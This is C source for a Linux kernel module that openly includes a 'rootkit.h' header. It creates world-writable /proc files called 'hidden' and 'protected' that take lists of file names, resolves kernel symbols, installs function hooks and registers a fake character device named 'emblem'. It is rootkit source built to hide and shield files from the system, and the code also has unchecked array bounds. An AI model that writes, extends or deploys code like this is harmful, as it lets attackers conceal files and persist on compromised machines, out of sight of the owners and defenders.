#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/uaccess.h>
#include <linux/fs.h>
#include <linux/device.h>
#include <linux/cdev.h>
#include <linux/proc_fs.h>
#include <linux/string.h>

#include "rootkit.h"

MODULE_DESCRIPTION("fs_module");
MODULE_AUTHOR("Novikov Artem");
MODULE_LICENSE("GPL");

#define PROC_FILE_NAME_HIDDEN "hidden"
#define PROC_FILE_NAME_PROTECTED "protected"

static char buffer[MAX_BUF_SIZE];
char tmp_buffer[MAX_BUF_SIZE];
char hidden_files[100][100];
int hidden_index = 0;
char protected_files[100][100];
int protected_index = 0;

static ssize_t my_proc_write(struct file *file, const char __user *buf, size_t len, loff_t *ppos)
{
	DBG("my_proc_write called");
	
	if (len > MAX_BUF_SIZE - write_index + 1)
	{
		DBG("buffer overflow");
		return -ENOMEM;
	}
	
	if (copy_from_user(&buffer[write_index], buf, len) != 0)
	{
		DBG("copy_from_user fail");
		return -EFAULT;
	}
	
	write_index += len;
	buffer[write_index - 1] = '\0';
	
	if (strcmp(file->f_path.dentry->d_name.name, PROC_FILE_NAME_HIDDEN) == 0)
	{
		snprintf(hidden_files[hidden_index], len, "%s", &buffer[write_index - len]);
		hidden_index++;
		DBG("file written to hidden %s", hidden_files[hidden_index - 1]);
	}
	else if (strcmp(file->f_path.dentry->d_name.name, PROC_FILE_NAME_PROTECTED) == 0)
	{
		snprintf(protected_files[protected_index], len, "%s", &buffer[write_index - len]);
		protected_index++;
		DBG("file written to protected %s", protected_files[protected_index - 1]);
	}
	else
	{
		DBG("Unknown file->f_path.dentry->d_name.name");
	}
	return len;
}

static ssize_t my_proc_read(struct file *file, char __user *buf, size_t len, loff_t *f_pos)
{
	DBG("my_proc_read called");
	
	if (*f_pos > 0 || write_index == 0)
	return 0;
	
	if (read_index >= write_index)
	read_index = 0;
	
	int read_len = snprintf(tmp_buffer, MAX_BUF_SIZE, "%s\n", &buffer[read_index]);
	
	if (copy_to_user(buf, tmp_buffer, read_len) != 0)
	{
		DBG("copy_to_user error.\n");
		return -EFAULT;
	}
	
	read_index += read_len;
	*f_pos += read_len;
	
	return read_len;
}

static const struct proc_ops fops = {
	.proc_read = my_proc_read,
	.proc_write = my_proc_write,
};

static int __init fh_init(void)
{
	struct device *fake_device;
	int error = 0;
	dev_t dev = 0;
	
	proc_file_hidden = proc_create(PROC_FILE_NAME_HIDDEN, S_IRUGO | S_IWUGO, NULL, &fops);
	if (!proc_file_hidden)
	{
		DBG("call proc_create() fail");
		return -ENOMEM;
	}
	
	proc_file_protected = proc_create(PROC_FILE_NAME_PROTECTED, S_IRUGO | S_IWUGO, NULL, &fops);
	if (!proc_file_protected)
	{
		remove_proc_entry(PROC_FILE_NAME_HIDDEN, NULL);
		DBG("call proc_create() fail");
		return -ENOMEM;
	}
	DBG("proc file created");
	
	error = init_kallsyms();
	if (error) {
		remove_proc_entry(PROC_FILE_NAME_HIDDEN, NULL);
		remove_proc_entry(PROC_FILE_NAME_PROTECTED, NULL);
		DBG("Failed to init kallsyms: %d", error);
		return error;
	}
	
	error = start_hook_resources();
	if (error)
	{
		remove_proc_entry(PROC_FILE_NAME_HIDDEN, NULL);
		remove_proc_entry(PROC_FILE_NAME_PROTECTED, NULL);
		DBG("return in hook functions");
		return error;
	}
	
	error = alloc_chrdev_region(&dev, 0, 1, "table");
	if (error < 0)
	{
		remove_proc_entry(PROC_FILE_NAME_HIDDEN, NULL);
		remove_proc_entry(PROC_FILE_NAME_PROTECTED, NULL);
		return error;
	}
	
	major = MAJOR(dev);
	minor = MINOR(dev);
	
	fake_class = class_create("custom_char_class");
	if (IS_ERR(fake_class)) {
		remove_proc_entry(PROC_FILE_NAME_HIDDEN, NULL);
		remove_proc_entry(PROC_FILE_NAME_PROTECTED, NULL);
		unregister_chrdev_region(dev, 1);
		return PTR_ERR(fake_class);
	}
	
	cdev_init(&fake_cdev, &fake_fops);
	fake_cdev.owner = THIS_MODULE;
	cdev_add(&fake_cdev, dev, 1);
	
	fake_device = device_create(fake_class,
	NULL,
	dev,
	NULL,
	"emblem");
	
	if (IS_ERR(fake_device))
	{
		remove_proc_entry(PROC_FILE_NAME_HIDDEN, NULL);
		remove_proc_entry(PROC_FILE_NAME_PROTECTED, NULL);
		class_destroy(fake_class);
		unregister_chrdev_region(dev, 1);
		return -1;
	}
	
	return 0;
}

static void __exit fh_exit(void)
{
	if (proc_file_hidden)
	{
		remove_proc_entry(PROC_FILE_NAME_HIDDEN, NULL);
		DBG("proc file removed (hidden)");
	}
	
	if (proc_file_protected)
	{
		remove_proc_entry(PROC_FILE_NAME_PROTECTED, NULL);
		DBG("proc file removed (protected)");
	}
	
	fh_remove_hooks(demo_hooks, ARRAY_SIZE(demo_hooks));
	unregister_chrdev_region(MKDEV(major, 0), 1);
	device_destroy(fake_class, MKDEV(major, 0));
	cdev_del(&fake_cdev);
	class_destroy(fake_class);
}

module_init(fh_init);
module_exit(fh_exit);